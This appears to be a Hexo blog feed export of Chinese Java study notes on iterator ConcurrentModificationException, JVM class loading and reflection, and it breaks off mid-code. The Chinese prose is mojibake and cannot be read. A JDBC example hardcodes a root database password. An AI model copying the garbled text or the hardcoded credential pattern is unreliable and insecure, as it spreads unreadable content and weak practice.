-listIterator‰ªéÂêéÂêëÂâçÈÅçÂéÜÔºö2020-08-07 11:07:44,838 DEBUG (com.huskyui.App:main) -42020-08-07 11:07:44,838 DEBUG (com.huskyui.App:main) -32020-08-07 11:07:44,839 DEBUG (com.huskyui.App:main) -22020-08-07 11:07:44,839 DEBUG (com.huskyui.App:main) -1*/</code></pre><h4 id="ÁªèÂÖ∏Âá∫Èîô"><a href="#ÁªèÂÖ∏Âá∫Èîô" class="headerlink" title="ÁªèÂÖ∏Âá∫Èîô"></a>ÁªèÂÖ∏Âá∫Èîô</h4><pre><code>        List&lt;Integer&gt; list = new ArrayList&lt;&gt;();        list.add(1);        list.add(2);        list.add(3);        list.add(4);        for (Integer value :list){            System.out.println(value);            if(value.equals(1)){                list.remove(value);            }        }// ÂèçÁºñËØëList&lt;Integer&gt; list = new ArrayList&lt;&gt;();list.add(1);list.add(2);list.add(3);list.add(4);Iterator iterator = list.iterator();while (iterator.hasNext()){    Integer value = (Integer)iterator.next();    System.out.println(value);    if(value.equals(1)){        list.remove(value);    }}// Âá∫Èîô// 1// Exception in thread &quot;main&quot; java.util.ConcurrentModificationException//    at java.util.ArrayList$Itr.checkForComodification(ArrayList.java:909)//    at java.util.ArrayList$Itr.next(ArrayList.java:859)//    at com.huskyui.App.main(App.java:24)// Êàë‰ª¨Êù•ÁúãiteratorÂú®ArrayListÁöÑÂÆûÁé∞private class Itr implements Iterator&lt;E&gt; {        int cursor;       // index of next element to return        int lastRet = -1; // index of last element returned; -1 if no such        int expectedModCount = modCount;        Itr() {}        // cursorÂ∞±ÊòØÊ∏∏Ê†áÁöÑÂ§ßÊ¶ÇÊÑèÊÄùÔºåsizeÊòØArrayListÁöÑÂÆπÈáè        public boolean hasNext() {            return cursor != size;        }        @SuppressWarnings(&quot;unchecked&quot;)        public E next() {            // Êä•ÈîôÊòØÂú®ËøôÈáå            checkForComodification();            int i = cursor;            if (i &gt;= size)                throw new NoSuchElementException();            Object[] elementData = ArrayList.this.elementData;            if (i &gt;= elementData.length)                throw new ConcurrentModificationException();            cursor = i + 1;            // ÁªôlastRetË¥üË¥£ÔºåÊúâÁÇπpreËäÇÁÇπÁöÑÂë≥ÈÅì‰∫Ü            return (E) elementData[lastRet = i];        }        public void remove() {            if (lastRet &lt; 0)                throw new IllegalStateException();            checkForComodification();            try {                ArrayList.this.remove(lastRet);                // ÊåáÂêëÂâç‰∏Ä‰∏™ËäÇÁÇπ                cursor = lastRet;                // lastRetËµãÂàùÂßãÂÄºÔºåÂú®ÂêéÁª≠ÊâßË°ånext()ÊñπÊ≥ïÊòØÂèØ‰ª•ÈáçÊñ∞ËµãÂÄº                lastRet = -1;                expectedModCount = modCount;            } catch (IndexOutOfBoundsException ex) {                throw new ConcurrentModificationException();            }        }        // Ëøô‰∏™modCountÊòØArrAyListÁªßÊâøÁöÑAbstractList‰∏≠ÁöÑÂèòÈáèÔºåËÆ∞ÂΩïËøô‰∏™arrayListÁöÑ‰øÆÊîπÊ¨°Êï∞„ÄÇË≠¨Â¶ÇÊàë‰ª¨Ê∑ªÂä†‰∫Ü4Ê¨°ÔºåÈÇ£‰πàËøô‰∏™Â∞±ÊòØ4        final void checkForComodification() {            if (modCount != expectedModCount)                throw new ConcurrentModificationException();        }</code></pre><p>‰∏∫‰ªÄ‰πàÊàë‰ª¨‰∏çËÉΩÂú®ÈÅçÂéÜÊó∂ÔºåÂà†Èô§ÔºåÂõ†‰∏∫arrayListÁöÑremoveÊó∂ÔºåÂπ∂Ê≤°Êúâ‰øÆÊîπexceptedModCount,ËÄåiteratorÂç¥ÂèØ‰ª•„ÄÇ</p><h4 id="ÂÖ≥‰∫éforeach‰∏§ÁßçÊñπÂºè"><a href="#ÂÖ≥‰∫éforeach‰∏§ÁßçÊñπÂºè" class="headerlink" title="ÂÖ≥‰∫éforeach‰∏§ÁßçÊñπÂºè"></a>ÂÖ≥‰∫éforeach‰∏§ÁßçÊñπÂºè</h4><p>foreachÊîØÊåÅ1.ÂÆûÁé∞‰∫ÜIteratorÊé•Âè£ÁöÑ2.Êï∞ÁªÑ<br>Á¨¨‰∏ÄÁßçÔºåIteratorÂèçÁºñËØëÂêéÔºåÂ∞±ÊòØ‰ΩøÁî®IteratorËø≠‰ª£Âô®Êù•ÂÆûÁé∞ÁöÑ<br>Á¨¨‰∫åÁßçÔºåÊï∞ÁªÑÂΩ¢ÂºèÁöÑforeach</p><pre><code>int[] array = new int[]{1,2,3,4,5};for (int num:array){    System.out.println(num);}// ÂèçÁºñËØëÂêéint[] array = new int[]{1, 2, 3, 4, 5};int[] var2 = array;int var3 = array.length;for(int var4 = 0; var4 &lt; var3; ++var4) {    int num = var2[var4];    System.out.println(num);}</code></pre><h4 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h4><p><a href="https://blog.csdn.net/CSDN2497242041/article/details/77902500" target="_blank" rel="noopener"> JavaÂü∫Á°Ä8ÔºöIteratorÂíåforeachÂæ™ÁéØ</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVMÁ±ªÂä†ËΩΩÂ≠êÁ≥ªÁªü</title>
      <link href="/2020/07/13/JVM%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%AD%90%E7%B3%BB%E7%BB%9F/"/>
      <url>/2020/07/13/JVM%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%AD%90%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Âú®Á∫¶Áø∞¬∑ÂÜØ¬∑ËØ∫‰ºäÊõºÁöÑËÆ°ÁÆóÊú∫Ê®°Âûã‰∏≠Ôºå‰ªª‰ΩïÁ®ãÂ∫èÈÉΩÈúÄË¶ÅÂä†ËΩΩÂà∞ÂÜÖÂ≠òÊâçËÉΩ‰∏éCPUËøõË°å‰∫§ÊµÅ„ÄÇ</p></blockquote><p><a href="https://imgchr.com/i/NTCoqI" target="_blank" rel="noopener"> <img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373836.10474923028.png" alt="Á±ªÂä†ËΩΩÂõæÁâá"></a></p><h4 id="Âä†ËΩΩËøáÁ®ãload"><a href="#Âä†ËΩΩËøáÁ®ãload" class="headerlink" title="Âä†ËΩΩËøáÁ®ãload"></a>Âä†ËΩΩËøáÁ®ãload</h4><ul><li>Ê†πÊçÆ‰∏Ä‰∏™Á±ªÁöÑÂÖ®ÈôêÁ±ªÂêçÊù•Ëé∑ÂèñÊ≠§Á±ªÁöÑ‰∫åËøõÂà∂ÊµÅÔºàÊ≠§Â§ÑÂπ∂Ê≤°ÊúâËØ¥ÊòØÁâπÊåáÁöÑÊú¨Âú∞classÊñá‰ª∂Ôºâ </li><li>Â∞ÜËøô‰∏™classÊñá‰ª∂ÊâÄ‰ª£Ë°®ÁöÑÈùôÊÄÅÂ≠òÂÇ®ÁªìÊûÑËΩ¨Âåñ‰∏∫ÊñπÊ≥ïÂå∫‰∏≠ÁöÑËøêË°åÊó∂ÁªìÊûÑ </li><li>Âú®ÂÜÖÂ≠ò‰∏≠ÁîüÊàê‰∏Ä‰∏™java.lang.Class ÂØπË±°ÔºåËøô‰∏™ÂØπË±°Â∞Ü‰Ωú‰∏∫Á®ãÂ∫èËÆøÈóÆÊñπÊ≥ïÂå∫‰∏≠ÁöÑÁ±ªÂûãÊï∞ÊçÆÁöÑÂ§ñÈÉ®Êé•Âè£ </li></ul><p>ÂÖ∂‰∏≠Ê≠§Á±ªÁöÑ‰∫åËøõÂà∂ÊµÅÔºå‰∏ç‰ªÖ‰ªÖÊòØÊú¨Âú∞ÁöÑ.classÊñá‰ª∂Ôºå‰πüÂèØ‰ª•ÊòØ‰ªéjarÔºåwarÂåÖ‰∏≠ÁöÑÔºåÊàñËÄÖ‰ΩøÁî®javaËá™Â∏¶ÁöÑÂü∫‰∫éÊé•Âè£ÁöÑÂä®ÊÄÅ‰ª£ÁêÜÔºåÊàñËÄÖÂü∫‰∫écglibÂä®ÊÄÅÁîüÊàêÁöÑ‰∫åËøõÂà∂ÊµÅÔºåÊàñËÄÖÊòØËÄÅÂºèÁöÑjspÔºå‰ª•ÂèäÂä†ÂØÜËß£ÂØÜÁöÑclassÊñá‰ª∂Á≠âÁ≠â</p><h4 id="ËøûÊé•link"><a href="#ËøûÊé•link" class="headerlink" title="ËøûÊé•link"></a>ËøûÊé•link</h4><p>ËøûÊé•ÂàÜ‰∏∫‰∏â‰∏™ÔºöÈ™åËØÅÔºåÂáÜÂ§áÔºåËß£Êûê</p><h5 id="È™åËØÅverification"><a href="#È™åËØÅverification" class="headerlink" title="È™åËØÅverification"></a>È™åËØÅverification</h5><p>È™åËØÅÊòØ‰∏∫‰∫ÜËøêË°åÂΩìÂâç‰ª£Á†Å‰∏ç‰ºöÂç±ÂÆ≥ËôöÊãüÊú∫Ëá™Ë∫´ÁöÑÂÆâÂÖ®</p><ul><li>Êñá‰ª∂Ê†ºÂºèÈ™åËØÅ Ôºö1.ÊòØÂê¶ÊòØ‰ª•0xCAFEBABEÂºÄÂ§¥2.ÁâàÊú¨Âè∑ÊòØÂê¶Âú®java </li><li>„ÄÇ„ÄÇ„ÄÇ„ÄÇ‰∏ãÈù¢Â∞±‰∏çÂ§öËµòËø∞ </li></ul><h5 id="ÂáÜÂ§áprepare"><a href="#ÂáÜÂ§áprepare" class="headerlink" title="ÂáÜÂ§áprepare"></a>ÂáÜÂ§áprepare</h5><p>‰∏∫Á±ªÂèòÈáèÔºàÂç≥ÈùôÊÄÅÂèòÈáèÔºåË¢´static‰øÆÈ•∞ÁöÑÂèòÈáèÔºâÂàÜÈÖçÂÜÖÂ≠òÂπ∂ËÆæÁΩÆÁ±ªÂèòÈáèÂàùÂßãÂåñ„ÄÇ</p><p>‰ΩÜÊòØÂ∏∏ÈáèÔºàfinal‰øÆÈ•∞ÔºâÂú®ÁºñËØëjavacÂ∞ÜÂ∏∏ÈáèÁîüÊàêConstantValueÂ±ûÊÄßÔºåÂú®ÂáÜÂ§áÈò∂ÊÆµÊ†πÊçÆConstantValueËÆæÁΩÆËµãÂÄº„ÄÇ</p><h5 id="Ëß£Êûê"><a href="#Ëß£Êûê" class="headerlink" title="Ëß£Êûê"></a>Ëß£Êûê</h5><p>javaËôöÊãüÊú∫Â∞ÜÂ∏∏ÈáèÊ±†ÂÜÖÁöÑÁ¨¶Âè∑ÂºïÁî®ÊõøÊç¢‰∏∫Áõ¥Êé•ÂºïÁî®ÁöÑËøáÁ®ã„ÄÇ</p><h4 id="ÂàùÂßãÂåñ"><a href="#ÂàùÂßãÂåñ" class="headerlink" title="ÂàùÂßãÂåñ"></a>ÂàùÂßãÂåñ</h4><ul><li>ÂàùÂßãÂåñÈò∂ÊÆµ‰ºöÊâßË°å <code>&lt;clinit&gt;</code> ÊñπÊ≥ï </li><li>Ë∞ÉÁî® <code>clinit</code> ÊñπÊ≥ïÂâç‰ºöË∞ÉÁî®ÂÖ∂Áà∂Á±ªÁöÑ <code>clinit</code> ÁöÑÊñπÊ≥ïÔºåÊúÄÂàùË∞ÉÁî®Â∫îËØ•ÊòØ <code>java.lang.object</code> ÁöÑ <code>clinit</code> ÊñπÊ≥ï </li><li>Â§öÁ∫øÁ®ãÁéØÂ¢É‰∏ã‰ºöÁ´û‰∫â <code>clinit</code> ÊñπÊ≥ïÔºàË¶ÅÈÅøÂÖçclinitÊòØ‰∏™Ê≠ªÈîÅÔºâ </li><li><code>clinit</code> ‰∏ªË¶ÅÊòØÂØπË¢´static‰øÆÈ•∞ÁöÑÂèòÈáèÂíåÈùôÊÄÅ‰ª£Á†ÅÂùóËøõË°åËµãÂÄº„ÄÇÂ¶ÇÊûúÈÉΩ‰∏çÂ≠òÂú®ÔºåÂ∞±Ê≤°Êúâ <code>clinit</code></li></ul><h5 id="ÂàùÂßãÂåñ6ÁßçÊÉÖÂÜµ"><a href="#ÂàùÂßãÂåñ6ÁßçÊÉÖÂÜµ" class="headerlink" title="ÂàùÂßãÂåñ6ÁßçÊÉÖÂÜµ"></a>ÂàùÂßãÂåñ6ÁßçÊÉÖÂÜµ</h5><ul><li>ÈÅáÂà∞new„ÄÅgetstatic„ÄÅputstatic„ÄÅÊàñinvokestaticËøô‰∏™4‰∏™Êåá‰ª§ÔºåÂ¶ÇÊûúÁ±ªÂûãÊ≤°ÂàùÂßãÂåñËøáÔºåÂ∞±‰ºöÂàùÂßãÂåñ‰∏Ä‰∏ã </li><li>ÈÄöËøáÂèçÂ∞ÑË∞ÉÁî®Êó∂ÔºåÂ¶ÇÊûúÊ≤°ÊúâÂàùÂßãÂåñÂ∞±‰ºöÂàùÂßãÂåñ‰∏Ä‰∏ã </li></ul><pre><code>// ËøôÊòØjava mysql jdbcÊúÄÂü∫Êú¨ÁöÑÊñπÂºè        // ‰ºöÈÄöËøáÁ±ªÂä†ËΩΩÊú∫Âà∂ÔºåÊâßË°åstaticÊñπÊ≥ïÂùóÔºåÂú®DriverMangerÈáåÈù¢Ê≥®ÂÜå‰∏Ä‰∏™MysqlÈ©±Âä®        Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);        Connection connection = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/test_index?useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=UTC&quot;,&quot;root&quot;,&quot;happyday&quot;);        Statement statement = connection.createStatement();        ResultSet resultSet = statement.executeQuery(&quot;select * from test limit 10&quot;);        while (resultSet.next()){            System.out.println(resultSet.getInt(&quot;id&quot;));        }//Êàë‰ª¨Êù•Áúã‰∏ãÔºåËøô‰∏™com.mysql.cj.jdbc.DriverÈáåÈù¢ÁöÑclinit static {        try {            java.sql.DriverManager.registerDriver(new Driver());        } catch (SQLException E) {            throw new RuntimeException(&quot;Can&apos;t register driver!&quot;);        }    }</code></pre><ul><li>ÂΩìÂàùÂßãÂåñÁ±ªÁöÑÊó∂ÂÄôÔºåÂ¶ÇÊûúÁà∂Á±ªÊ≤°ÊúâÂàùÂßãÂåñÔºå‰ºöËß¶ÂèëÁà∂Á±ªÁöÑÁöÑÂàùÂßãÂåñ </li></ul><pre><code>public class ClinitTest1 {    static class Father{        public static int a = 1;        static {            a = 2;        }    }    static class Son extends Father{        public static int b = a;    }    public static void main(String[] args) {        System.out.println(Son.b);    }}// ËæìÂá∫ 2</code></pre><ul><li>ÂΩìËôöÊãüÊú∫ÂêØÂä®Êó∂ÔºåÁî®Êà∑ÈúÄË¶ÅÁöÑÊåáÂÆö‰∏Ä‰∏™Ë¶ÅÊâßË°åÁöÑ‰∏ªÁ±ªÔºàÂåÖÂê´mainÔºàÔºâÔºâÔºåËôöÊãüÊú∫‰ºöÂä†ËΩΩËøô‰∏™Á±ª </li></ul><pre><code>// Êàë‰∏æ‰∫Ü‰∏Ä‰∏™‰∏çÁü•ÊÅ∞‰∏çÊÅ∞ÂΩìÁöÑ‰æãÂ≠êÔºåÈÄöËøáÊï∞ÁªÑÂÆö‰πâÂºïÁî®Á±ªÂπ∂‰∏ç‰ºöËß¶ÂèëÊ≠§Á±ªÁöÑÂàùÂßãÂåñpublic class TestClass {    static {        System.out.println(&quot;static method&quot;);    }    public static void main(String[] args) {        TestClass[] testClasses = new TestClass[10];    }}// ËæìÂá∫ static methodpublic class TestClass2 {    public static void main(String[] args) {        TestClass[] testClasses = new TestClass[10];    }}// Êó†ËæìÂá∫</code></pre><ul><li>ÂΩì‰ΩøÁî®JDK 7Êñ∞Âä†ÂÖ•ÁöÑÂä®ÊÄÅËØ≠Ë®ÄÊîØÊåÅÊó∂ÔºåÂ¶ÇÊûú‰∏Ä‰∏™java.lang.invoke.MethodHandleÂÆû‰æãÊúÄÂêéÁöÑËß£ÊûêÁªìÊûú‰∏∫REF_getStatic„ÄÅREF_putStatic„ÄÅREF_invokeStatic„ÄÅREF_newInvokeSpecialÂõõÁßçÁ±ªÂûãÁöÑÊñπÊ≥ïÂè•ÊüÑÔºåÂπ∂‰∏îËøô‰∏™ÊñπÊ≥ïÂè•ÊüÑÂØπÂ∫îÁöÑÁ±ªÊ≤°ÊúâËøõË°åËøáÂàùÂßãÂåñÔºåÂàôÈúÄË¶ÅÂÖàËß¶ÂèëÂÖ∂ÂàùÂßãÂåñ„ÄÇ </li><li>ÂΩì‰∏Ä‰∏™Êé•Âè£‰∏≠ÂÆö‰πâ‰∫ÜJDK 8Êñ∞Âä†ÂÖ•ÁöÑÈªòËÆ§ÊñπÊ≥ïÔºàË¢´defaultÂÖ≥ÈîÆÂ≠ó‰øÆÈ•∞ÁöÑÊé•Âè£ÊñπÊ≥ïÔºâÊó∂ÔºåÂ¶ÇÊûúÊúâËøô‰∏™Êé•Âè£ÁöÑÂÆûÁé∞Á±ªÂèëÁîü‰∫ÜÂàùÂßãÂåñÔºåÈÇ£ËØ•Êé•Âè£Ë¶ÅÂú®ÂÖ∂‰πãÂâçË¢´ÂàùÂßãÂåñ </li></ul><h4 id="‰∏æ‰æã"><a href="#‰∏æ‰æã" class="headerlink" title="‰∏æ‰æã"></a>‰∏æ‰æã</h4><pre><code>public class ClassInitTest {    private static int num ;    static {        num = 2;        number = 20;        System.out.println(num);        // System.out.println(number);ÈùûÊ≥ïÂâçÂÉèÂºïÁî®    }    private static int number = 10;    public static void main(String[] args) {        System.out.println(num);        System.out.println(number);    }}// ËæìÂá∫/**2210*//**clinitÊñπÊ≥ï 0 iconst_2 1 putstatic #2 &lt;org/example/jvm/classload/ClassInitTest.num&gt; 4 bipush 20 6 putstatic #3 &lt;org/example/jvm/classload/ClassInitTest.number&gt; 9 getstatic #4 &lt;java/lang/System.out&gt;12 getstatic #2 &lt;org/example/jvm/classload/ClassInitTest.num&gt;15 invokevirtual #5 &lt;java/io/PrintStream.println&gt;18 bipush 1020 putstatic #3 &lt;org/example/jvm/classload/ClassInitTest.number&gt;23 return*//**ÂèçÁºñËØëÁöÑclassÊñá‰ª∂//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package org.example.jvm.classload;public class ClassInitTest {    private static int num = 2;    private static int number = 20;    public ClassInitTest() {    }    public static void main(String[] args) {        System.out.println(num);        System.out.println(number);    }    static {        System.out.println(num);        number = 10;    }}*/</code></pre><p>ËøòÊúâÂæàÂ§öÊàëÊ≤°Êúâ‰∏æ‰æãÂà∞ÔºåÂ¶ÇÂ§öÁ∫øÁ®ãÁ´û‰∫âstaticÊñπÊ≥ïÔºåÊï∞ÁªÑ„ÄÇ„ÄÇ„ÄÇ</p><h4 id="Á±ªÂä†ËΩΩÂô®"><a href="#Á±ªÂä†ËΩΩÂô®" class="headerlink" title="Á±ªÂä†ËΩΩÂô®"></a>Á±ªÂä†ËΩΩÂô®</h4><p>java Âõ¢ÈòüÊúâÊÑèÊääÁ±ªÁöÑÂä†ËΩΩÈò∂ÊÆµÁöÑ‚ÄúÈÄöËøá‰∏Ä‰∏™Á±ªÁöÑÂÖ®ÈôêÂÆöÂêçÊù•Ëé∑ÂèñÊèèËø∞ËØ•Á±ªÁöÑ‰∫åËøõÂà∂Â≠óËäÇÊµÅ‚ÄùÊîæÂà∞javaËôöÊãüÊú∫Â§ñÈÉ®ÂÆûÁé∞Ôºå‰ª•‰æøËÆ©Á®ãÂ∫èËá™Â∑±ÂÜ≥ÂÆöÂéªËé∑ÂèñÊâÄÈúÄÁ±ª„ÄÇ</p><p>Ëøô‰∏™Êó∂ÂÄôÔºåÂ¶ÇÊûúÊòØ‰∏§‰∏™ÂØπË±°ÊØîËæÉÊòØÂê¶Áõ∏Á≠âÁöÑÂâçÊèêÂøÖÈ°ªÊòØÂêå‰∏Ä‰∏™Á±ªÂä†ËΩΩÂô®Âä†ËΩΩÊØîËæÉÊâçÊúâÊÑè‰πâ„ÄÇ</p><pre><code>public class ClassLoaderTest {    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException {        ClassLoader classLoader = new ClassLoader() {            @Override            public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException {                try {                    String fileName = name.substring(name.lastIndexOf(&quot;.&quot;) + 1) + &quot;.class&quot;;                    InputStream is = getClass().getResourceAsStream(fileName);                    if (is == null) {                        return super.loadClass(name);                    }                    byte[] b = new byte[is.available()];                    is.read(b);                    return defineClass(name, b, 0, b.length);                } catch (IOException e) {                    e.printStackTrace();                }                return null;            }        };        Object obj = classLoader.loadClass(&quot;org.example.jvm.classload.ClassLoaderTest&quot;).newInstance();        System.out.println(obj);        System.out.println(obj instanceof org.example.jvm.classload.ClassLoaderTest);        Object obj2 = new ClassLoaderTest();        System.out.println(obj2 instanceof org.example.jvm.classload.ClassLoaderTest);    }}// ËæìÂá∫org.example.jvm.classload.ClassLoaderTest@6e0be858falsetrue</code></pre><h5 id="Á±ªÂä†ËΩΩÂô®Ê®°Âûã"><a href="#Á±ªÂä†ËΩΩÂô®Ê®°Âûã" class="headerlink" title="Á±ªÂä†ËΩΩÂô®Ê®°Âûã"></a>Á±ªÂä†ËΩΩÂô®Ê®°Âûã</h5><p><a href="https://imgchr.com/i/UGJk7D" target="_blank" rel="noopener"> ![UGJk7D.png](http://qjrzrivoh.hd-<br>bkt.clouddn.com/1605373836.27754478999.png) </a></p><pre><code>public class ClassLoaderTest {    public static void main(String[] args) {        // Ëé∑ÂèñÁ≥ªÁªüÁ±ªÂä†ËΩΩÂô®        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();        System.out.println(systemClassLoader);// sun.misc.Launcher$AppClassLoader@18b4aac2        // Ëé∑ÂèñÊâ©Â±ïÁ±ªÂä†ËΩΩÂô®        ClassLoader extClassLoader =  systemClassLoader.getParent();        System.out.println(extClassLoader);// sun.misc.Launcher$ExtClassLoader@135fbaa4        // ËØïÂõæËé∑Âèñbootstrap classloader ‰ΩÜÊ≤°ÊúâËé∑ÂèñÂà∞‰∏∫Á©∫        System.out.println(extClassLoader.getParent());        // String ÊòØÈÄöËøáÂºïÂØºÁ±ªÊù•Ëé∑ÂèñÁöÑ==&gt;java Ê†∏ÂøÉÂ∫ìÈÉΩÊòØÈÄöËøábootstrap class loader Êù•ÂºïÂØºÁöÑ        System.out.println(String.class.getClassLoader());        // sun.misc.Launcher$AppClassLoader@18b4aac2        System.out.println(ClassLoaderTest.class.getClassLoader());    }}// ËæìÂá∫sun.misc.Launcher$AppClassLoader@18b4aac2sun.misc.Launcher$ExtClassLoader@4b67cf4dnullnullsun.misc.Launcher$AppClassLoader@18b4aac2</code></pre><h5 id="ÂêÑ‰∏™Á±ªÂä†ËΩΩÂô®ÁöÑËÅåË¥£"><a href="#ÂêÑ‰∏™Á±ªÂä†ËΩΩÂô®ÁöÑËÅåË¥£" class="headerlink" title="ÂêÑ‰∏™Á±ªÂä†ËΩΩÂô®ÁöÑËÅåË¥£"></a>ÂêÑ‰∏™Á±ªÂä†ËΩΩÂô®ÁöÑËÅåË¥£</h5><ul><li>Bootstrap Class Loader : Âä†ËΩΩÊ†∏ÂøÉÂ∫ìÔºàJAVA_HOME/jre/lib/rt.jarÂíåresources.jarÂíåsun.boot.classÔºâ,ÊòØÈÄöËøác++ÁºñÂÜôÔºåjavaËé∑ÂèñÊó∂ÊòØnullÔºåË≠¨Â¶ÇString.classÂ∞±Bootstarp Class LoaderÂä†ËΩΩÁöÑ </li><li>Extension Class LoaderÔºö Âä†ËΩΩÊâ©Â±ïÂ∫ìÔºàjava.ext.dirsÊàñjre/lib/extÂåÖÔºâ </li><li>Application Class Loader:Âä†ËΩΩÁî®Êà∑Ëá™ÂÆö‰πâÁöÑÁ±ª </li></ul><h5 id="Âèå‰∫≤ÂßîÊ¥æÊú∫Âà∂"><a href="#Âèå‰∫≤ÂßîÊ¥æÊú∫Âà∂" class="headerlink" title="Âèå‰∫≤ÂßîÊ¥æÊú∫Âà∂"></a>Âèå‰∫≤ÂßîÊ¥æÊú∫Âà∂</h5><p>Âèå‰∫≤ÂßîÊ¥æÊ®°ÂûãÂ∫îËØ•ÊòØÂè´Ê∫ØÊ∫êÂßîÊ¥æÂä†ËΩΩÊ®°ÂûãÔºåËµ∑ÂàùÂä†ËΩΩÁ±ªÊó∂ÔºåÊòØ‰æùÊ¨°Âêë‰∏äËØ¢ÈóÆÊòØÂê¶Â∑≤Âä†ËΩΩËøáÔºå<br>ÁÑ∂ÂêéÂÜçÂêë‰∏ãÈÄêÂ±ÇËØ¢ÈóÆÊòØÂê¶ÂèØÂä†ËΩΩ„ÄÇ‰∏ÄËà¨Âú®‰∏ªÊµÅ‰∏≠Èó¥‰ª∂ÈÉΩÊúâËá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®ÔºåÂÆûÁé∞Á±ªÁöÑÈöîÁ¶ªÔºåÈò≤Ê≠¢ÂÜ≤Á™Å„ÄÇ</p><h5 id="‰ªÄ‰πàÊÉÖÂÜµÈúÄË¶ÅËá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®"><a href="#‰ªÄ‰πàÊÉÖÂÜµÈúÄË¶ÅËá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®" class="headerlink" title="‰ªÄ‰πàÊÉÖÂÜµÈúÄË¶ÅËá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®"></a>‰ªÄ‰πàÊÉÖÂÜµÈúÄË¶ÅËá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®</h5><ul><li>ÈöîÁ¶ªÂä†ËΩΩÁ±ªÔºöÂú®Êüê‰∫õÂÆπÂô®Ê°ÜÊû∂Á±ªËøõË°å‰∏≠Èó¥‰ª∂ÂíåÂ∫îÁî®ÁöÑÈöîÁ¶ªÔºåÊääÁ±ªÂä†ËΩΩÂà∞‰∏çÂêåÁéØÂ¢É„ÄÇË≠¨Â¶Çmybatis‰∏≠org/apache/ibatis/io‰∏≠Â∞±ÊúâËá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô® </li><li>Èò≤Ê≠¢Ê∫êÁ†ÅÊ≥ÑÈú≤Ôºöclass Êñá‰ª∂Â¶ÇÊûúÊ≠£Â∏∏jarÂåÖÂèçÁºñËØëÔºåËß£Âéã‰∏Ä‰∏ãÂ∞±ÂèØ‰ª•ÁúãËßÅÊ∫êÁ†ÅÔºåÊâÄ‰ª•ÈúÄË¶ÅÁºñËØëÂä†ÂØÜÔºåÂπ∂‰∏îËá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®Êù•ÂÆûÁé∞Ëß£ÂØÜËøòÂéüÂ≠óËäÇÁ†Å„ÄÇ </li><li>Á≠âÁ≠â </li></ul><h4 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h4><ul><li>„ÄäÁ†ÅÂá∫È´òÊïà„Äã </li><li>„ÄäÊ∑±ÂÖ•ÁêÜËß£JVMËôöÊãüÊú∫„Äã </li><li>Â∞öÁ°ÖË∞∑JVMËßÜÈ¢ë </li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂèçÂ∞Ñ‰∏éÊ≥®Ëß£</title>
      <link href="/2020/07/09/%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%B3%A8%E8%A7%A3/"/>
      <url>/2020/07/09/%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%B3%A8%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h4 id="Ëé∑ÂèñClassÁ±ªÁöÑÂÆû‰æã"><a href="#Ëé∑ÂèñClassÁ±ªÁöÑÂÆû‰æã" class="headerlink" title="Ëé∑ÂèñClassÁ±ªÁöÑÂÆû‰æã"></a>Ëé∑ÂèñClassÁ±ªÁöÑÂÆû‰æã</h4><p>a) Ëã•Â∑≤Áü•ÂÖ∑‰ΩìÁöÑÁ±ªÔºåÈÄöËøáÁ±ªÁöÑclassÂ±ûÊÄßËé∑ÂèñÔºåËØ•ÊñπÊ≥ïÊúÄ‰∏∫ÂÆâÂÖ®ÂèØÈù†ÔºåÁ®ãÂ∫èÊÄßËÉΩÊúÄÈ´ò</p><pre><code>Class clazz = Person.class;</code></pre><p>b) Ëã•Â∑≤Áü•Êüê‰∏™Á±ªÁöÑÂÆû‰æãÔºåË∞ÉÁî®ËØ•ÂÆû‰æãÁöÑgetClass()ÊñπÊ≥ïËé∑ÂèñClassÂØπË±°</p><pre><code>Class clazz = person.getClass();</code></pre><p>cÔºâÂ∑≤Áü•‰∏Ä‰∏™Á±ªÁöÑÂÖ®Á±ªÂêçÔºå‰∏îËØ•Á±ªÂú®Á±ªË∑ØÂæÑ‰∏ãÔºåÂèØ‰ª•ÈÄöËøáClassÁöÑÈùôÊÄÅÊñπÊ≥ïforName()Ëé∑ÂèñÔºåÂèØËÉΩ‰ºöÊäõÂá∫ClassNotFoundException</p><pre><code>Class clazz = Class.forName(&quot;com.test.Person&quot;);</code></pre><p>d) ÂÜÖÁΩÆÂü∫Êú¨Êï∞ÊçÆÁ±ªÂûãÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®Á±ªÂêç.Type</p><p>e) ËøòÂèØ‰ª•‰ΩøÁî®ClassLoaderÊàë‰ª¨‰πãÂêéËÆ≤Ëß£</p><h4 id="ÂèçÂ∞ÑÂ§ßËá¥‰ΩøÁî®"><a href="#ÂèçÂ∞ÑÂ§ßËá¥‰ΩøÁî®" class="headerlink" title="ÂèçÂ∞ÑÂ§ßËá¥‰ΩøÁî®"></a>ÂèçÂ∞ÑÂ§ßËá¥‰ΩøÁî®</h4><pre><code>public static void main(String[] args) throws ClassNotFoundException, 